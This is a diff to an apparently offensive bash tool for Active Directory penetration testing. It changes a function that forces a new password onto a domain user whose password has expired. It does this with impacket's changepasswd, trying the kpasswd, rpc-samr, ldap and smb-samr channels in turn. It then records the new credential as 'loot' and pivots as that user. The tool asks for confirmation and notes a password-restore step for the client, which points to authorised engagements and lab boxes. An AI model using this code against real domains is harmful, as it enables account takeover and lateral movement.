@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.35.6"
+readonly VERSION="1.35.7"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -850,21 +850,30 @@ _change_expired_password() {
     [[ -z "$PASS" ]] && return 1            # need current plaintext to change it
     local tool; tool=$(command -v changepasswd.py || command -v impacket-changepasswd) || return 1
     local newpw="$PIVOT_PW" host="${DC_FQDN:-$DC_IP}"
-    warn "Password for '${USER}' is EXPIRED / must change — resetting via kpasswd to regain access"
+    warn "Password for '${USER}' is EXPIRED / must-change — resetting to regain access (the weak/known pw is the foothold on boxes like Sendai)"
     abuse_confirm "  Set a new password for '${USER}' (expired anyway) and continue as them?" || return 1
-    run "$tool $DOMAIN/$USER:***@$host -newpass *** -p kpasswd -dc-ip $DC_IP"
-    if "$tool" "$DOMAIN/$USER:$PASS@$host" -newpass "$newpw" -p kpasswd -dc-ip "$DC_IP" 2>&1 \
-         | tee -a "$LOGFILE" | grep -qiE 'changed successfully|password was changed|success'; then
-        loot "★ Changed expired password for '${USER}' → pivoting as that user"
+    # The transport that works depends on the DC: kpasswd (Kerberos), rpc-samr
+    # (SMB), or ldap. Force-pinning one (we used to pin kpasswd) fails on DCs where
+    # that channel is closed — try them in order and stop at the first success.
+    local proto out ok=0
+    for proto in kpasswd rpc-samr ldap smb-samr; do
+        run "$tool $DOMAIN/$USER:***@$host -newpass *** -p $proto -dc-ip $DC_IP"
+        out=$("$tool" "$DOMAIN/$USER:$PASS@$host" -newpass "$newpw" -p "$proto" -dc-ip "$DC_IP" 2>&1)
+        printf '%s\n' "$out" >>"$LOGFILE"
+        if grep -qiE 'changed successfully|password was changed|success' <<<"$out"; then ok=1; break; fi
+        grep -qiE 'unrecognized arguments|invalid choice' <<<"$out" && continue   # this impacket build lacks -p <proto>
+    done
+    if [[ "$ok" == "1" ]]; then
+        loot "★ Changed expired password for '${USER}' (via $proto) → pivoting as that user"
         rb_record "Changed expired password for $USER (was expired; original unknown)" \
                   "echo 'Manual: coordinate password restore for $USER with the client'"
         add_secret "$newpw" "expired-password reset for $USER"
-        note_cred_source "$USER" "expired-password reset via kpasswd"
+        note_cred_source "$USER" "expired-password reset ($proto)"
         unset "SEEN_CREDS[$(cred_key "$USER" "$PASS" "")]"
         queue_cred "$USER" "$newpw" ""
         return 0
     fi
-    warn "Could not change the expired password for '${USER}'"; return 1
+    warn "Could not change the expired password for '${USER}' (tried kpasswd/rpc-samr/ldap) — last: ${out##*$'\n'}"; return 1
 }
 
 # Read the WHY behind a failed Kerberos auth and act on it. Returns 0 when the
